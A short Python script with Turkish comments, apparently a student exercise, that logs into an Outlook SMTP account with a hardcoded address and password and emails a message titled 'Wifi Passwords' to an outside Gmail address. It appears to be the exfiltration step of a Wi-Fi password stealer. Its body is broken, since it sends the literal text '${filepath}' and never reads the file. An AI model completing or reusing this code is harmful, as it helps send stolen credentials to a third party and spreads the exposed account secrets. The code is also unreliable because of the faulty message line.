from smtplib import SMTP

filepath = "C:\\Users\\SPECIAL TEK\\Desktop\\3.sınıf\\bilgi sistmeleri pdfler\\ödevler\\wifiPass"

try:
    # Mail Mesaj Bilgisi 
    subcjet = "Wifi Passwords"
    message = "${filepath}"
    content = "Subject: {0}\n\n{1}".format(subcjet,message)

    # Hesap Bilgileri 
    myMailAdress = "dasrfaws@hotmail.com"
    password = "12341234aa"

    # Kime Gönderilecek Bilgisi
    sendTo = "suleymanabbud0@gmail.com"

    mail = SMTP("smtp.outlook.com", 587)
    mail.ehlo()
    mail.starttls()
    mail.login(myMailAdress,password)
    mail.sendmail(myMailAdress, sendTo, content.encode("utf-8"))
    print("Mail Gönderme İşlemi Başarılı!")
except Exception as e:
    print("Hata Oluştu!\n {0}".format(e))
